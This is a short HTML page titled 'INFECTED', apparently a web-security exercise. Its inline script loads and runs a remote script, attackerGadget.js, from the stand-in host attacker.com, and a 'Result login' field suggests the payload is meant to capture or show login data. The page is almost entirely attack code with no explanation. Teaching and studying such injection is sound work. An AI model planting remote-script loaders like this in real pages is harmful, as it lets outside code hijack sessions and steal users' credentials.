<!DOCTYPE html>
<html lang="en" id="frame">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INFECTED</title>
    <script>
        const protocol = window.location.protocol;
        const port = window.location.port;

        const scriptElement = document.createElement("script");
        scriptElement.src = `${protocol}//attacker.com:${port}/tp5/mycode/attackerGadget.js`
        document.getElementById("frame").appendChild(scriptElement);
    </script>
</head>
<body>
    <h1>INFECTED</h1>
    <div>Result login: <span id="result"></span></div>
</body>
</html>